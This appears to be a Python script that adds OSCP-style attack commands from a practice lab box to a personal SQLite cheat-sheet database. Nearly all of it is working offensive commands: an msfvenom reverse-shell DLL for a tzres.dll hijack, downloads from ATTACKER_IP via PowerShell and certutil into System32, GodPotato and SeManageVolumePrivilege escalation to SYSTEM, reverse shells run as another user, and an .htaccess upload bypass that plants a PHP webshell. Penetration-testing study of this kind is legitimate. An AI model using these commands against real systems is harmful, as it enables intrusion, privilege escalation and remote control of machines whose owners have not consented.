#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - INTERNAL BOX PATCH    ##
##############################################
Adds techniques from Internal PG box:
  - Invoke-RunasCs
  - SeManageVolumePrivilege abuse
  - GodPotato SYSTEM shell
  - htaccess upload bypass
  - tzres.dll DLL hijack
Usage:
    python3 internal_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

internal_commands = [
    {
        "tool": "Invoke-RunasCs",
        "description": "Execute command as another user without interactive logon -- bypasses runas restrictions",
        "command": "Import-Module .\\Invoke-RunasCs.ps1; Invoke-RunasCs -Username USER -Password PASS -Command 'whoami'",
        "category": "lateral-movement",
        "tags": "windows,runas,lateral-movement,credentials,invoke-runascs"
    },
    {
        "tool": "Invoke-RunasCs",
        "description": "Execute reverse shell as another user using Invoke-RunasCs",
        "command": "Import-Module .\\Invoke-RunasCs.ps1; Invoke-RunasCs -Username USER -Password PASS -Command 'C:\\Windows\\Temp\\shell.exe'",
        "category": "lateral-movement",
        "tags": "windows,runas,lateral-movement,reverseshell,invoke-runascs"
    },
    {
        "tool": "SeManageVolumeExploit",
        "description": "Abuse SeManageVolumePrivilege to gain full control over C:\\ drive. Run before DLL hijack.",
        "command": ".\\SeManageVolumeExploit.exe",
        "category": "privesc",
        "tags": "windows,privesc,semanagevolume,dll-hijack,system"
    },
    {
        "tool": "tzres.dll",
        "description": "DLL hijack via wbem after SeManageVolumeExploit. Drop msfvenom dll then run systeminfo from wbem dir.",
        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f dll -o tzres.dll",
        "category": "privesc",
        "tags": "windows,privesc,dll-hijack,semanagevolume,wbem,tzres"
    },
    {
        "tool": "tzres.dll",
        "description": "Upload tzres.dll to wbem and trigger with systeminfo -- run FROM wbem directory",
        "command": "powershell -c \"iwr http://ATTACKER_IP/tzres.dll -OutFile C:\\Windows\\System32\\wbem\\tzres.dll\"; cd C:\\Windows\\System32\\wbem; systeminfo",
        "category": "privesc",
        "tags": "windows,privesc,dll-hijack,semanagevolume,wbem,tzres,systeminfo"
    },
    {
        "tool": "GodPotato",
        "description": "SeImpersonatePrivilege on network service -- execute command as SYSTEM",
        "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,godpotato,system,networkservice"
    },
    {
        "tool": "GodPotato",
        "description": "SeImpersonatePrivilege -- execute reverse shell as SYSTEM via GodPotato",
        "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c C:\\Windows\\Temp\\shell.exe\"",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,godpotato,system,reverseshell"
    },
    {
        "tool": "htaccess",
        "description": "Bypass file upload extension filter -- tell Apache to execute custom extension as PHP",
        "command": "echo 'AddType application/x-httpd-php .pwnz' > .htaccess",
        "category": "web",
        "tags": "web,upload-bypass,htaccess,php,apache,file-upload"
    },
    {
        "tool": "htaccess",
        "description": "Upload .htaccess and PHP webshell via curl to bypass extension filtering",
        "command": "curl -X POST http://TARGET/upload.php -H 'Referer: http://TARGET/' -F 'the_file=@.htaccess' -F 'submit=Purchase' && curl -X POST http://TARGET/upload.php -H 'Referer: http://TARGET/' -F 'the_file=@shell.pwnz' -F 'submit=Purchase'",
        "category": "web",
        "tags": "web,upload-bypass,htaccess,php,apache,curl,file-upload"
    },
    {
        "tool": "certutil",
        "description": "Download file to Windows target when PowerShell iwr fails -- works from restricted shells",
        "command": "certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\\Windows\\Temp\\file.exe",
        "category": "transfer",
        "tags": "windows,download,certutil,file-transfer,lolbas"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in internal_commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:50]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:50]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
